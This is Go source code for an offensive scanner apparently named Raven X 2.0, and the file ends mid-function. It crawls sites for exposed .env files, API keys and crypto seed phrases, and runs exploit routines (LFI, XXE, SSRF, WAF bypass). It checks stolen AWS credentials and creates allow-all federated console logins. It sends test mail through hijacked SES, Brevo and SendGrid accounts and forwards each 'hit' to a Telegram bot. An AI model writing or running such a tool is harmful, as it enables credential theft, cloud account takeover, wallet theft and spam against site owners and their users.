		//regexp.MustCompile(`(?i)apiKey["']?\s*[:=]\s*["'](AIza[0-9A-Za-z\-_]{35})["']`),
		//regexp.MustCompile(`(?i)SUPABASE_KEY["']?\s*[:=]\s*["']?([A-Za-z0-9-_]{32,200})["']?`),
		//regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z\-_]{35})["']`),
		//regexp.MustCompile(`(?i)YA29\.[0-9A-Za-z\-_]{10,200}`),
		//regexp.MustCompile(`(?i)sk_live_[0-9a-zA-Z]{16,64}`),
	}

	for _, p := range ePatterns {
		a.RealCryptoPatterns = append(a.RealCryptoPatterns, p)
	}
}

func (e *Enhancer) CrawlAndExtract(startURL string, maxDepth int, a *AWSScanner) {
	visited := make(map[string]struct{})
	queue := []struct {
		url   string
		depth int
	}{{startURL, 0}}

	for len(queue) > 0 {
		item := queue[0]
		queue = queue[1:]
		if item.depth > maxDepth {
			continue
		}
		if _, ok := visited[item.url]; ok {
			continue
		}
		visited[item.url] = struct{}{}

		body, headers, err := e.fetchURL(item.url)
		if err != nil {
			continue
		}

		e.scanHeaders(headers, item.url, a)

		a.checkAndSaveKeys(body, item.url)

		params := e.extractParamsFromURL(item.url)
		for _, p := range params {
			a.checkAndSaveKeys(p, item.url)
		}

		// Run exploit functions untuk ekstraksi credentials (tanpa goroutine terpisah untuk menghindari ledakan)
		// Exploit functions sudah cukup cepat dan tidak perlu parallelization tambahan
		if a.Config.ExploitMethods.React2Shell {
			a.ExploitReact2Shell(item.url, item.url)
		}
		if a.Config.ExploitMethods.BypassWAF {
			a.ExploitBypassWAF(item.url, item.url)
		}
		if a.Config.ExploitMethods.BypassMiddleware {
			a.ExploitBypassMiddleware(item.url, item.url)
		}
		if a.Config.ExploitMethods.LFI {
			a.ExploitLFI(item.url, item.url)
		}
		if a.Config.ExploitMethods.XXE {
			a.ExploitXXE(item.url, item.url)
		}
		if a.Config.ExploitMethods.SSRF {
			a.ExploitSSRF(item.url, item.url)
		}

		scripts := e.extractScriptSrc(body, item.url)
		for _, s := range scripts {
			jsBody, _, err := e.fetchURL(s)
			if err == nil {
				a.checkAndSaveKeys(jsBody, s)
				if decoded := e.tryUnpackJS(jsBody); decoded != "" {
					a.checkAndSaveKeys(decoded, s+" (unpack)")
				}
			}
			if item.depth+1 <= maxDepth && e.isSameHost(startURL, s) {
				queue = append(queue, struct {
					url   string
					depth int
				}{s, item.depth + 1})
			}
		}

		if item.depth == 0 {
			sm, _ := e.fetchSitemap(startURL)
			for _, u := range sm {
				if _, ok := visited[u]; !ok {
					if item.depth+1 <= maxDepth {
						queue = append(queue, struct {
							url   string
							depth int
						}{u, 1})
					}
				}
			}
		}

		links := e.extractLinksFromHTML(body, item.url)
		for _, l := range links {
			if _, ok := visited[l]; ok {
				continue
			}
			if item.depth+1 <= maxDepth && e.isSameHost(startURL, l) {
				queue = append(queue, struct {
					url   string
					depth int
				}{l, item.depth + 1})
			}
		}

	}
}

func (e *Enhancer) fetchURL(rawurl string) (string, map[string][]string, error) {
	if !strings.HasPrefix(rawurl, "http") {
		return "", nil, errors.New("not-http")
	}
	req, err := http.NewRequest("GET", rawurl, nil)
	if err != nil {
		return "", nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; RavenX-Enhancer/1.0)")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := e.client.Do(req.WithContext(ctx))
	if err != nil {
		return "", nil, err
	}
	defer resp.Body.Close()

	// Batasi response body untuk mencegah OOM
	b, err := ioutil.ReadAll(io.LimitReader(resp.Body, 512*1024)) // 512KB max
	if err != nil {
		return "", nil, err
	}

	return string(b), resp.Header, nil
}

func (e *Enhancer) scanHeaders(h map[string][]string, source string, a *AWSScanner) {
	for k, vals := range h {
		for _, v := range vals {
			if strings.Contains(strings.ToLower(k), "x-api") || strings.Contains(strings.ToLower(k), "authorization") || strings.Contains(strings.ToLower(k), "x-amz") {
				a.checkAndSaveKeys(v, source+" (header:"+k+")")
			}
			if e.base64Candidate.MatchString(v) {
				if dec := tryDecodeBase64(v); dec != "" {
					a.checkAndSaveKeys(dec, source+" (header-decoded)")
				}
			}
		}
	}
}

func (e *Enhancer) extractParamsFromURL(raw string) []string {
	vals := []string{}
	u, err := url.Parse(raw)
	if err != nil {
		matches := e.urlParamPattern.FindAllStringSubmatch(raw, -1)
		for _, m := range matches {
			if len(m) > 2 {
				v, _ := url.QueryUnescape(m[2])
				vals = append(vals, v)
			}
		}
		return vals
	}
	for _, vs := range u.Query() {
		for _, v := range vs {
			if len(v) >= 8 {
				vals = append(vals, v)
			}
		}
	}
	return vals
}

func (e *Enhancer) extractScriptSrc(htmlBody string, base string) []string {
	out := []string{}
	matches := e.scriptSrcPattern.FindAllStringSubmatch(htmlBody, -1)
	for _, m := range matches {
		if len(m) > 1 {
			src := strings.TrimSpace(m[1])
			if src == "" {
				continue
			}
			if strings.HasPrefix(src, "//") {
				src = "https:" + src
			}
			if strings.HasPrefix(src, "/") {
				if u, err := url.Parse(base); err == nil {
					src = u.Scheme + "://" + u.Host + src
				}
			}
			out = append(out, src)
		}
	}
	return unique(out)
}

func (e *Enhancer) tryUnpackJS(js string) string {
	if m := e.evalAtobPattern.FindStringSubmatch(js); len(m) > 1 {
		cand := m[1]
		switch len(cand) % 4 {
		case 2:
			cand += "=="
		case 3:
			cand += "="
		}
		if b, err := base64.StdEncoding.DecodeString(cand); err == nil {
			if isPrintableText(b) {
				return string(b)
			}
		}
	}

	if m := e.evalUnescapePatt.FindString(js); m != "" {
		unescaped := strings.TrimPrefix(m, "eval(unescape(\"")
		unescaped = strings.TrimSuffix(unescaped, "\"))")
		unescaped = strings.TrimPrefix(unescaped, "eval(unescape('")
		unescaped = strings.TrimSuffix(unescaped, "'))")

		unq, err := url.QueryUnescape(unescaped)
		_ = err
		if unq != "" {
			return unq
		}
	}

	if m := e.base64Candidate.FindString(js); m != "" {
		if dec := tryDecodeBase64(m); dec != "" {
			return dec
		}
	}

	return ""
}

func (e *Enhancer) fetchSitemap(baseRaw string) ([]string, error) {
	u, err := url.Parse(baseRaw)
	if err != nil {
		return nil, err
	}
	roots := []string{
		fmt.Sprintf("%s://%s/sitemap.xml", u.Scheme, u.Host),
		fmt.Sprintf("%s://%s/sitemap_index.xml", u.Scheme, u.Host),
	}
	res := []string{}
	for _, s := range roots {
		body, _, err := e.fetchURL(s)
		if err != nil {
			continue
		}
		matches := e.sitemapPattern.FindAllStringSubmatch(body, -1)
		for _, m := range matches {
			if len(m) > 1 {
				res = append(res, strings.TrimSpace(m[1]))
			}
		}
		if len(res) > 0 {
			return unique(res), nil
		}
	}
	return res, errors.New("no sitemap")
}

func (e *Enhancer) extractLinksFromHTML(body, base string) []string {
	hrefP := regexp.MustCompile(`(?i)href=["']([^"'#]+)["']`)
	outs := []string{}
	matches := hrefP.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) > 1 {
			link := strings.TrimSpace(m[1])
			if strings.HasPrefix(link, "javascript:") || strings.HasPrefix(link, "mailto:") {
				continue
			}
			if strings.HasPrefix(link, "/") {
				if u, err := url.Parse(base); err == nil {
					link = u.Scheme + "://" + u.Host + link
				}
			}
			if strings.HasPrefix(link, "http") {
				outs = append(outs, link)
			}
		}
	}
	return unique(outs)
}

func (e *Enhancer) isSameHost(a, b string) bool {
	u1, err1 := url.Parse(a)
	u2, err2 := url.Parse(b)
	if err1 != nil || err2 != nil {
		return false
	}
	return strings.EqualFold(u1.Hostname(), u2.Hostname())
}

func extractValueFromPhpInfoTable(htmlContent, settingName string) string {
	regexString := fmt.Sprintf(`(?is)<td\s+class="e">.*?%s.*?</td>\s*<td\s+class="v">(.*?)</td>`, regexp.QuoteMeta(settingName))
	re := regexp.MustCompile(regexString)
	match := re.FindStringSubmatch(htmlContent)
	if len(match) > 1 {
		val := strings.TrimSpace(match[1])
		val = strings.ReplaceAll(val, "&nbsp;", " ")
		val = strings.ReplaceAll(val, "&quot;", "\"")
		val = strings.Trim(val, "\"'")
		return val
	}
	return ""
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return string(b)
}

func GenerateRandomEmail() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return fmt.Sprintf("%s@%s.com", string(b), "randomtestdomain")
}

func IsIgnoredExt(ext string) bool {
	ignored := []string{".jpg", ".jpeg", ".png", ".gif", ".exe", ".zip", ".pdf", ".css", ".html", ".svg", ".woff", ".woff2", ".mp4", ".mp3", ".json", ".lock"}
	for _, i := range ignored {
		if strings.EqualFold(ext, i) {
			return true
		}
	}
	return false
}

func unique(input []string) []string {
	m := make(map[string]struct{})
	var out []string
	for _, s := range input {
		if _, ok := m[s]; !ok {
			m[s] = struct{}{}
			out = append(out, s)
		}
	}
	return out
}

func resolveURL(base, ref string) string {
	u, err := url.Parse(ref)
	if err != nil {
		return ref
	}
	if u.IsAbs() {
		return ref
	}
	baseURL, err := url.Parse(base)
	if err != nil {
		return ref
	}
	return baseURL.ResolveReference(u).String()
}

func loadEnvPaths() []string {
	// If paths.txt exists alongside main.go, read it line-by-line and prefer those
	// paths over the built-in list. Lines starting with # are ignored.
	if data, err := os.ReadFile("paths.txt"); err == nil {
		var lines []string
		for _, ln := range strings.Split(string(data), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") {
				continue
			}
			lines = append(lines, ln)
		}
		if len(lines) > 0 {
			return lines
		}
	}

	return []string{
		"/.env",
		"/api/.env",
		"/app/.env",
		"/system/.env",
		"/laravel/.env",
		"/core/.env",
		"/vendor/.env",
		"/storage/.env",
		"/public/.env",
		"/dev/.env",
		"/api/v1/.env",
		"/api/v2/.env",
		"/admin/.env",
		"/.environment",
		"/api/.environment",
		"/app/.environment",
		"/.env.dist",
		"/.env.local.php",
		"/config/.env",
		"/config/env",
		"/config/environment",
		"/app/config/.env",
		"/apps/.env",
		"/apps/config/.env",
		"/backend/.env",
		"/client/.env",
		"/clients/.env",
		"/customer/.env",
		"/customers/.env",
		"/admin/config/.env",
		"/administrator/.env",
		"/wp/.env",
		"/wordpress/.env",
		"/cms/.env",
		"/database/.env",
		"/db/.env",
		"/upload/.env",
		"/uploads/.env",
		"/backup/.env",
		"/backups/.env",
		"/.backup/.env",
		"/backup/env",
		"/old/.env",
		"/new/.env",
		"/2020/.env",
		"/2021/.env",
		"/2022/.env",
		"/2023/.env",
		"/2024/.env",
		"/v1/.env",
		"/v2/.env",
		"/v3/.env",
		"/api/config/.env",
		"/api/core/.env",
		"/api/app/.env",
		"/api/test/.env",
		"/api/dev/.env",
		"/api/beta/.env",
		"/beta/.env",
		"/prod/.env",
		"/production/.env",
		"/stage/.env",
		"/staging/.env",
		"/test/.env",
		"/testing/.env",
		"/development/.env",
		"/develop/.env",
		"/docker/.env",
		"/docker-compose/.env",
		"/.docker/.env",
		"/src/.env",
		"/source/.env",
		"/sources/.env",
		"/root/.env",
		"/home/.env",
		"/site/.env",
		"/panel/.env",
		"/control/.env",
		"/console/.env",
		"/admin/console/.env",
		"/administrator/config/.env",
		"/webadmin/.env",
		"/sysadmin/.env",
		"/mysql/.env",
		"/dbadmin/.env",
		"/sql/.env",
		"/master/.env",
		"/temp/.env",
		"/tmp/.env",
		"/cloud/.env",
		"/cgi-bin/.env",
		"/blog/.env",
		"/blogs/.env",
		"/engine/.env",
		"/forum/.env",
		"/forums/.env",
		"/store/.env",
		"/shop/.env",
		"/cart/.env",
	}
}

func (a *AWSScanner) saveIntoFile(line, filename string) {
	os.MkdirAll("ResultJS", 0755)
	f, err := os.OpenFile(filepath.Join("ResultJS", filename), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func (a *AWSScanner) sendTelegram(message string) {
	if a.Config.Telegram.BotToken == "" || a.Config.Telegram.ChatID == "" {
		return
	}

	// Generate unique hash dari message untuk tracking
	// Extract key portion dari message untuk uniqueness
	messageHash := a.generateTelegramHash(message)

	// Cek apakah message sudah pernah dikirim
	if _, loaded := a.SentTelegrams.LoadOrStore(messageHash, true); loaded {
		pterm.Debug.Printfln("[TELEGRAM SKIP] Duplicate message prevented: %s", messageHash[:16]+"...")
		return
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", a.Config.Telegram.BotToken)
	data := url.Values{}
	data.Set("chat_id", a.Config.Telegram.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")
	http.PostForm(apiURL, data)

	pterm.Debug.Printfln("[TELEGRAM SENT] Message hash: %s", messageHash[:16]+"...")
}

// tgHit returns the standard notification header for a credential find.
//   📬 NEW RANDOM SMTP HIT VIA torch2 3408 ® ID : 43745531
//   Cracked on https://example.com
func (a *AWSScanner) tgHit(emoji, hitType, sourceURL string) string {
	listName := a.Config.SessionName
	if listName == "" {
		listName = "scanner"
	}
	globalCounters.mu.Lock()
	cnt := globalCounters.APIsFoundTotal
	globalCounters.mu.Unlock()
	hitID := rand.Int63n(90000000) + 10000000
	return fmt.Sprintf("%s NEW %s HIT VIA %s %d ® ID : %d\nCracked on %s\n", emoji, hitType, listName, cnt, hitID, sourceURL)
}

// generateTelegramHash membuat unique hash dari message untuk deduplication
func (a *AWSScanner) generateTelegramHash(message string) string {
	// Extract key portions yang membuat message unique
	// Biasanya berupa credential values di dalam <code> tags

	codePattern := regexp.MustCompile(`<code>([^<]+)</code>`)
	matches := codePattern.FindAllStringSubmatch(message, -1)

	var keyParts []string
	for _, match := range matches {
		if len(match) > 1 {
			value := strings.TrimSpace(match[1])
			// Skip values yang terlalu pendek (< 4 chars) atau generic text
			if len(value) >= 4 && !strings.HasPrefix(value, "http") {
				keyParts = append(keyParts, value)
			}
		}
	}

	// Jika tidak ada <code> tags yang valid, extract type dari message
	if len(keyParts) == 0 {
		// Extract message type sebagai fallback
		typePattern := regexp.MustCompile(`<b>([A-Z\s]+(?:KEY|TOKEN|ACCOUNT|CRACKED))</b>`)
		if typeMatch := typePattern.FindStringSubmatch(message); len(typeMatch) > 1 {
			// Gunakan type + first 200 chars sebagai unique ID
			if len(message) > 200 {
				return typeMatch[1] + "|" + message[:200]
			}
			return typeMatch[1] + "|" + message
		}
		// Last resort: gunakan first 300 chars dari message
		if len(message) > 300 {
			return message[:300]
		}
		return message
	}

	// Gabungkan semua key parts sebagai unique identifier
	// Sort untuk konsistensi (case insensitive comparison)
	uniqueID := strings.Join(keyParts, "|")
	return strings.ToLower(uniqueID)
}

func (a *AWSScanner) alreadySent(ak, sk string) bool {
	path := filepath.Join("ResultJS", "aws_valid.txt")
	b, err := ioutil.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
		return false
	}
	return strings.Contains(string(b), fmt.Sprintf("%s:%s", ak, sk))
}

func (a *AWSScanner) logFound(name, key, source string) {
	pterm.Warning.Printfln("[FOUND] %s: %s | Source: %s", name, key, source)
}

func (a *AWSScanner) logValid(name, details string) {
	pterm.Success.Printfln("[VALID] %s: %s", name, details)
}

func (a *AWSScanner) storeValidKeyLimit(keyType string, key string, limit interface{}) {
	if limit == nil {
		return
	}
	globalCounters.mu.Lock()
	defer globalCounters.mu.Unlock()
	keyPrefix := key
	if len(key) > 40 {
		keyPrefix = key[:40]
	}
	maskedKey := keyPrefix
	if len(maskedKey) > 10 {
		maskedKey = maskedKey[:4] + "..." + maskedKey[len(maskedKey)-4:]
	} else if len(maskedKey) > 4 {
		maskedKey = maskedKey[:4] + "..."
	}
	mapKey := fmt.Sprintf("%s:%s", keyType, maskedKey)
	a.ValidKeyLimits.Store(mapKey, fmt.Sprintf("%v", limit))
}

func (a *AWSScanner) detectRealCryptoType(keyValue string, pattern *regexp.Regexp) string {
	// Hanya mnemonic seed phrase yang di-track
	return "Mnemonic Seed Phrase"
}

func (a *AWSScanner) extractAndSaveCryptoKeys(text, sourceURL string) {
	for _, pattern := range a.RealCryptoPatterns {
		matches := pattern.FindAllStringSubmatch(text, -1)
		for _, match := range matches {
			if len(match) >= 2 {
				var keyValue string
				if len(match) >= 2 && match[1] != "" {
					keyValue = match[1]
				} else {
					continue
				}
				keyValue = strings.TrimSpace(keyValue)

				// Validasi mnemonic: harus berisi 12-24 kata lowercase
				words := strings.Fields(keyValue)
				if len(words) < 12 || len(words) > 24 {
					continue
				}

				// Validasi setiap kata harus lowercase a-z
				validMnemonic := true
				for _, word := range words {
					if !regexp.MustCompile(`^[a-z]+$`).MatchString(word) {
						validMnemonic = false
						break
					}
				}

				if !validMnemonic {
					continue
				}

				cryptoType := "Mnemonic Seed Phrase"
				wordCount := len(words)
				cryptoLine := fmt.Sprintf("%s:%s (%d words):%s", sourceURL, cryptoType, wordCount, keyValue)

				pterm.Success.Printfln("[🔥 %s] Found %d-word Mnemonic from %s", cryptoType, wordCount, sourceURL)

				a.saveIntoFile(cryptoLine, "mnemonic_seed_phrases.txt")

				go a.sendTelegram(a.tgHit("💰", "CRYPTO PHRASE HIT", sourceURL) + fmt.Sprintf(
					"\n🆔 CREDENTIALS\nPhrase (%d words) : %s\n", wordCount, keyValue))

				globalCounters.mu.Lock()
				globalCounters.CryptoKeysFound++
				globalCounters.mu.Unlock()
			}
		}
	}
}

func getAllRegions(service string) ([]string, error) {
	return []string{
		"us-east-1", "us-east-2", "us-west-1", "us-west-2",
		"af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
		"ap-southeast-1", "ap-southeast-2", "ap-southeast-3", "ca-central-1",
		"eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-north-1", "eu-south-1", "eu-south-2", "eu-central-2",
		"me-south-1", "me-central-1", "sa-east-1",
	}, nil
}

func (a *AWSScanner) checkS3Access(cfg aws.Config) string {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(cfg)

	output, err := s3Client.ListBuckets(ctx, &s3.ListBucketsInput{})

	if err == nil && output != nil {
		count := len(output.Buckets)
		if count > 0 {
			return fmt.Sprintf("✅ S3 List: %d Buckets Found", count)
		}
		return "✅ S3 List: Permitted (0 Buckets)"
	}

	return "❌ S3 List: Denied or Error"
}

func (a *AWSScanner) auditIAMUser(cfg aws.Config, username string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	iamClient := iam.NewFromConfig(cfg)
	var riskReport []string

	inlinePols, err := iamClient.ListUserPolicies(ctx, &iam.ListUserPoliciesInput{UserName: aws.String(username)})
	if err == nil {
		riskReport = append(riskReport, fmt.Sprintf("Inline Policies: %v", inlinePols.PolicyNames))
		for _, pname := range inlinePols.PolicyNames {
			if strings.Contains(strings.ToLower(pname), "admin") {
				riskReport = append(riskReport, "⚠️ CRITICAL: Potential Admin Inline Policy Detected")
			}
		}
	}

	attachedPols, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{UserName: aws.String(username)})
	if err == nil {
		var polNames []string
		for _, p := range attachedPols.AttachedPolicies {
			polNames = append(polNames, *p.PolicyName)
			if *p.PolicyName == "AdministratorAccess" {
				riskReport = append(riskReport, "🚨 CRITICAL: AdministratorAccess Attached!")
			}
		}
		riskReport = append(riskReport, fmt.Sprintf("Managed Policies: %v", polNames))
	}

	if len(riskReport) == 0 {
		return "No explicit policies found (likely implicit or group based)"
	}
	return strings.Join(riskReport, " | ")
}

func (a *AWSScanner) validateAWSCredentials(accessKey, secretKey, sessionToken string) (bool, *sts.GetCallerIdentityOutput, aws.Config, string) {
	ctx := context.Background()

	cfg, err := config.LoadDefaultConfig(ctx,
		config.WithRegion(a.DefaultRegion),
		config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, sessionToken)),
	)
	if err != nil {
		return false, nil, aws.Config{}, ""
	}

	stsClient := sts.NewFromConfig(cfg)
	identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})

	if err != nil {
		return false, nil, aws.Config{}, ""
	}

	s3Status := a.checkS3Access(cfg)

	return true, identity, cfg, s3Status
}

func (a *AWSScanner) getFederationConsoleURL(cfg aws.Config, identity *sts.GetCallerIdentityOutput, durationSeconds int32) map[string]string {
	if !a.Config.AWSChecks.FederationConsoleURL { // Menggunakan flag baru
		return nil
	}
	ctx := context.Background()
	stsClient := sts.NewFromConfig(cfg)

	sessionName := "FederatedUser" + randomString(6)
	policy := map[string]interface{}{
		"Version":   "2012-10-17",
		"Statement": []map[string]interface{}{{"Effect": "Allow", "Action": "*", "Resource": "*"}},
	}
	policyBytes, _ := json.Marshal(policy)

	getToken, err := stsClient.GetFederationToken(ctx, &sts.GetFederationTokenInput{
		Name:            aws.String(sessionName),
		Policy:          aws.String(string(policyBytes)),
		DurationSeconds: aws.Int32(durationSeconds),
	})
	if err != nil {
		return nil
	}

	creds := getToken.Credentials
	sessionJson, _ := json.Marshal(map[string]string{
		"sessionId":    *creds.AccessKeyId,
		"sessionKey":   *creds.SecretAccessKey,
		"sessionToken": *creds.SessionToken,
	})

	signinURL := "https://signin.aws.amazon.com/federation"
	getTokenURL := fmt.Sprintf("%s?Action=getSigninToken&Session=%s", signinURL, url.QueryEscape(string(sessionJson)))

	resp, err := http.Get(getTokenURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var tokenResp struct {
		SigninToken string `json:"SigninToken"`
	}
	json.Unmarshal(body, &tokenResp)

	destination := "https://console.aws.amazon.com/"
	finalURL := fmt.Sprintf("%s?Action=login&Issuer=aws_scanner&Destination=%s&SigninToken=%s",
		signinURL, url.QueryEscape(destination), url.QueryEscape(tokenResp.SigninToken))

	return map[string]string{
		"federation_console_url": finalURL,
		"session_name":           sessionName,
		"expires_at":             creds.Expiration.Format(time.RFC3339),
		"arn":                    *identity.Arn,
	}
}

func (a *AWSScanner) checkSESDetailsAllRegions(cfg aws.Config) map[string]map[string]interface{} {
	if !a.Config.AWSChecks.SESQuotaCheck { // Menggunakan flag baru
		return map[string]map[string]interface{}{}
	}
	ctx := context.Background()
	regions, _ := getAllRegions("ses")
	results := make(map[string]map[string]interface{})

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		sesClient := ses.NewFromConfig(cfg)
		sesv2Client := sesv2.NewFromConfig(cfg)
		quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{})
		if err != nil {
			continue
		}

		account, err := sesv2Client.GetAccount(ctx, &sesv2.GetAccountInput{})
		health := "Unknown"
		if err == nil && account != nil && account.EnforcementStatus != nil {
			health = *account.EnforcementStatus
		}

		// Get email identities
		identities := []string{}
		identitiesResp, err := sesv2Client.ListEmailIdentities(ctx, &sesv2.ListEmailIdentitiesInput{})
		if err == nil && identitiesResp != nil {
			for _, identity := range identitiesResp.EmailIdentities {
				if identity.IdentityName != nil {
					identities = append(identities, *identity.IdentityName)
				}
			}
		}

		if quota.Max24HourSend > 0 {
			results[region] = map[string]interface{}{
				"SendQuota":    quota.Max24HourSend,
				"LastSend":     quota.SentLast24Hours,
				"MaxSendRate":  quota.MaxSendRate,
				"HealthStatus": health,
				"Identities":   identities,
			}
		}
	}
	return results
}

// SendEmailViaAWS mengirim email menggunakan AWS SES
func (a *AWSScanner) SendEmailViaAWS(cfg aws.Config, accessKey, secretKey, sourceURL string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["from_email"] = ""
	result["region"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0
	result["identities"] = []string{}

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	ctx := context.Background()
	regions, _ := getAllRegions("ses")

	for _, region := range regions {
		cfg.Region = region
		sesv2Client := sesv2.NewFromConfig(cfg)

		// List email identities untuk region ini
		identitiesResp, err := sesv2Client.ListEmailIdentities(ctx, &sesv2.ListEmailIdentitiesInput{})
		if err != nil || identitiesResp == nil || len(identitiesResp.EmailIdentities) == 0 {
			continue
		}

		// Ambil email identity pertama yang tersedia
		var fromEmail string
		for _, identity := range identitiesResp.EmailIdentities {
			if identity.IdentityName != nil {
				fromEmail = *identity.IdentityName
				break
			}
		}

		if fromEmail == "" {
			continue
		}

		// Get quota info
		sesClient := ses.NewFromConfig(cfg)
		quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{})
		if err != nil {
			continue
		}

		// Coba kirim email
		subject := "Raven X 2.0 - Credential Test"
		body := fmt.Sprintf(`This is a test email from Raven X 2.0 Scanner.

Credentials found at: %s
Access Key: %s
Secret Key: %s

This email confirms that the AWS SES credentials are working.`, sourceURL, accessKey, secretKey)

		emailContent := &types.EmailContent{
			Simple: &types.Message{
				Subject: &types.Content{
					Data:    aws.String(subject),
					Charset: aws.String("UTF-8"),
				},
				Body: &types.Body{
					Text: &types.Content{
						Data:    aws.String(body),
						Charset: aws.String("UTF-8"),
					},
				},
			},
		}

		destination := &types.Destination{
			ToAddresses: []string{a.Config.EmailTarget},
		}

		sendEmailInput := &sesv2.SendEmailInput{
			FromEmailAddress: aws.String(fromEmail),
			Destination:      destination,
			Content:          emailContent,
		}

		_, err = sesv2Client.SendEmail(ctx, sendEmailInput)
		if err == nil {
			result["success"] = true
			result["from_email"] = fromEmail
			result["region"] = region
			result["quota_limit"] = quota.Max24HourSend
			result["quota_remaining"] = quota.Max24HourSend - quota.SentLast24Hours

			identities := []string{}
			for _, identity := range identitiesResp.EmailIdentities {
				if identity.IdentityName != nil {
					identities = append(identities, *identity.IdentityName)
				}
			}
			result["identities"] = identities
			return result
		}
	}

	result["error"] = "Failed to send email from any region with identities"
	return result
}

// SendEmailViaBrevo mengirim email menggunakan Brevo API
// fromEmail: email dari hasil validasi (dari account info)
func (a *AWSScanner) SendEmailViaBrevo(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari account info
	if fromEmail == "" {
		reqInfo, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
		reqInfo.Header.Set("api-key", key)
		respInfo, err := client.Do(reqInfo)
		if err == nil && respInfo.StatusCode == 200 {
			var accountInfo map[string]interface{}
			json.NewDecoder(respInfo.Body).Decode(&accountInfo)
			respInfo.Body.Close()

			if email, ok := accountInfo["email"].(string); ok && email != "" {
				fromEmail = email
			}

			if plan, ok := accountInfo["plan"].([]interface{}); ok && len(plan) > 0 {
				if planData, ok := plan[0].(map[string]interface{}); ok {
					if credits, ok := planData["credits"].(float64); ok {
						result["quota_limit"] = credits
						result["quota_remaining"] = credits
					}
				}
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"sender": map[string]interface{}{
			"name":  "Raven X 2.0",
			"email": fromEmail,
		},
		"to": []map[string]interface{}{
			{"email": a.Config.EmailTarget},
		},
		"subject": "Raven X 2.0 - Brevo Credential Test",
		"htmlContent": fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p>
<p>Credentials found at: %s</p>
<p>Key: %s</p>
<p>This email confirms that the Brevo credentials are working.</p>`, sourceURL, key),
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://api.brevo.com/v3/smtp/email", bytes.NewReader(jsonData))
	req.Header.Set("api-key", key)
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 201 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaSendGrid mengirim email menggunakan SendGrid API
// fromEmail: email dari hasil validasi (dari verified sender)
func (a *AWSScanner) SendEmailViaSendGrid(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari verified senders
	if fromEmail == "" {
		reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/verified_senders", nil)
		reqSenders.Header.Set("Authorization", "Bearer "+key)
		respSenders, err := client.Do(reqSenders)
		if err == nil && respSenders.StatusCode == 200 {
			var sendersResp map[string]interface{}
			json.NewDecoder(respSenders.Body).Decode(&sendersResp)
			respSenders.Body.Close()

			if results, ok := sendersResp["results"].([]interface{}); ok && len(results) > 0 {
				if firstSender, ok := results[0].(map[string]interface{}); ok {
					if email, ok := firstSender["from"].(map[string]interface{}); ok {
						if emailAddr, ok := email["email"].(string); ok && emailAddr != "" {
							fromEmail = emailAddr
						}
					}
				}
			}
		}
	}

	// Get account info untuk quota
	reqInfo, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
